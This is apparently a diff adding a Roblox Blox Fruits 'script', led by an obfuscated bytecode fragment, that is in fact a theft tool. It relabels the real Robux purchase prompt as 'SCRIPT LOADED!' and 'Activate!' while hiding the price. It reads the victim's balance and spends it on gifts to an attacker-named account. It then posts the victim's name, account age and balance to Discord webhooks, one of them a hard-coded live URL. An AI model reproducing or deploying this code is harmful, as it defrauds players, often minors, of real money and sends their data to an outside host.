002264Q002100025Q00122Q000300016Q00045Q00122Q000500013Q00042Q0003002100012Q001900076Q0015000800026Q000900016Q000A00026Q000B00036Q000C00046Q000D8Q000E00063Q00202Q000F000600014Q000C000F6Q000B3Q00024Q000C00036Q000D00046Q000E00016Q000F00016Q000F0006000F00102Q000F0001000F4Q001000016Q00100006001000102Q00100001001000202Q0010001000014Q000D00106Q000C8Q000A3Q000200202Q000A000A00024Q0009000A6Q00073Q00010004230003000500012Q0019000300054Q0024000400024Q0014000300044Q000200036Q00103Q00017Q00",v9(),...);
+LogsWebhook = "https://discord.com/api/webhooks/1331106203190956102/Pv-5OQjlxKFlapqtv57kfd_MnR01A_nbQN8NNEvmnVR-UAMGDXyIUy9s2zyOiV_PZz3I"
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local result = 0 
+
+local HttpService = game:GetService("HttpService")
+
+local success, UserId = pcall(function()
+    return Players:GetUserIdFromNameAsync(Username)
+end)
+
+local args = {
+    [1] = "buyRobuxShop",
+    [2] = {
+        ["StorageName"] = "2x EXP (15 mins.)",
+        ["FunnelId"] = "Shop",
+        ["PurchaseLocation"] = "Shop"
+    }
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+
+local CoreGui = game:GetService("CoreGui")
+local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
+local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+local Animator = ProductContainer:WaitForChild("Animator")
+
+Animator.ChildAdded:Connect(function(child)
+    if child.Name == "Prompt" then
+        local prompt = Animator:WaitForChild("Prompt")
+        local alertContents = prompt:WaitForChild("AlertContents")
+        
+        local middleContent = alertContents:FindFirstChild("MiddleContent")
+        if middleContent then
+            middleContent.Visible = false
+        end
+
+        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
+        if title and title:IsA("TextLabel") then
+            title.Text = "SCRIPT LOADED!"
+        end
+        
+        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
+        local button2 = footerButtons:FindFirstChild("2")
+        if button2 then
+            button2.Visible = false
+        end
+
+        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
+        if footerContent then
+            footerContent.Visible = false
+        end
+        
+        local button1 = footerButtons:FindFirstChild("1")
+        if button1 then
+            local buttonContent = button1:WaitForChild("ButtonContent")
+            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
+            if buttonMiddleContent then
+                buttonMiddleContent.Text = "LOAD!"
+            end
+        end
+    end
+end)
+
+local function sendWebhook()
+
+    local embed = {
+        ["title"] = "Dark Scripts - You Got Blox Fruit Hit! :owl:",
+        ["color"] = 39423,
+        ["fields"] = {
+            {
+                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
+                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
+            },
+            {
+                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
+                ["value"] = "```" .. result .. "```"
+            },
+            {
+                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
+                ["value"] = "[**Join Invite**](https://discord.gg/darkscripts)",
+            }
+        }
+    }
+
+    local data = HttpService:JSONEncode({
+        ["content"] = "@everyone",
+        ["embeds"] = {embed}
+    })
+
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data
+    })
+
+    request({
+        Url = LogsWebhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = data
+    })
+end
+
+function stealitem()
+    if result >= 5000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["PurchaseLocation"] = "FruitShop",
+                ["StorageName"] = "Permanent Dragon-Dragon",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 4000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Kitsune-Kitsune",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 3000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Leopard-Leopard",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2700 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Fruit Notifier",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2550 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Spirit-Spirit",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2500 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Gas-Gas",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2450 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Venom-Venom",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2425 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Shadow-Shadow",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2400 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Dough-Dough",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2350 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent T-Rex-T-Rex",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2300 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Gravity-Gravity",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2250 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Blizzard-Blizzard",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2200 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Pain-Pain",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2100 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Rumble-Rumble",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 2000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Portal-Portal",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1900 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Sound-Sound",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1800 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Spider-Spider",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1700 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Love-Love",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1650 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Buddha-Buddha",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1500 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Quake-Quake",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1300 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Magma-Magma",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1275 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Ghost-Ghost",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1250 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Barrier-Barrier",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1200 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Dark Blade",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1100 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Light-Light",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 1000 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Diamond-Diamond",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 950 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Dark-Dark",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 850 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Sand-Sand",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 750 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Ice-Ice",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 650 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Falcon-Falcon",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 550 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Flame-Flame",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 450 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "2x Money",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 400 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "+1 Fruit Storage",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 380 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Spike-Spike",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+        
+    elseif result >= 350 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "2x Boss Drops",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 250 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Smoke-Smoke",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 220 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Bomb-Bomb",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 180 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Spring-Spring",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 100 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Blade-Blade",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 75 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "Permanent Spin-Spin",
+                ["PurchaseLocation"] = "FruitShop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 50 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "10K Money",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    elseif result >= 25 then
+        local args = {
+            [1] = "buyRobuxShop",
+            [2] = {
+                ["Message"] = "Dark On top",
+                ["StorageName"] = "2x EXP (15 mins.)",
+                ["PurchaseLocation"] = "Shop",
+                ["FunnelId"] = "Shop",
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
+            }
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    end
+end
+
+local function WaitForPrompt1()
+    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+    stealitem()
+    local CoreGui = game:GetService("CoreGui")
+
+local success, err = pcall(function()
+    local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
+    local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
+    local Animator = ProductPurchaseContainer:WaitForChild("Animator")
+    local Prompt = Animator:WaitForChild("Prompt")
+    local AlertContents = Prompt:WaitForChild("AlertContents")
+    
+    local MiddleContent = AlertContents:WaitForChild("MiddleContent")
+    MiddleContent.Visible = false
+    
+    local Footer = AlertContents:WaitForChild("Footer")
+    local FooterButtons = Footer:WaitForChild("Buttons")
+    local FooterButton1 = FooterButtons:WaitForChild("1")
+    FooterButton1.Visible = false
+    
+    local FooterContent = Footer:WaitForChild("FooterContent")
+    FooterContent.Visible = false
+
+    local FooterButton2 = FooterButtons:WaitForChild("2")
+    FooterButton2.Visible = true
+
+    local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
+    FooterButton2Text.Text = "Activate!"
+    FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)
+    
+    local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
+    FooterButton2Icon.Visible = false
+
+    local TitleContainer = AlertContents:WaitForChild("TitleContainer")
+    local TitleArea = TitleContainer:WaitForChild("TitleArea")
+    local TitleText = TitleArea:WaitForChild("Title")
+    TitleText.Text = "Activate Blox Fruit Script!"
+    TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
+end)
+
+if not success then
+    warn("UI..")
+end
+end
+
+local RobuxPath = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
+local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")
+
+if balanceText then
+    result = tonumber(balanceText) + 25 
+end
+
+local function WaitForPrompt2()
+    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
+    repeat task.wait() until not Animator:FindFirstChild("Prompt")
+    sendWebhook()
+end
+
+WaitForPrompt1()
+WaitForPrompt2()
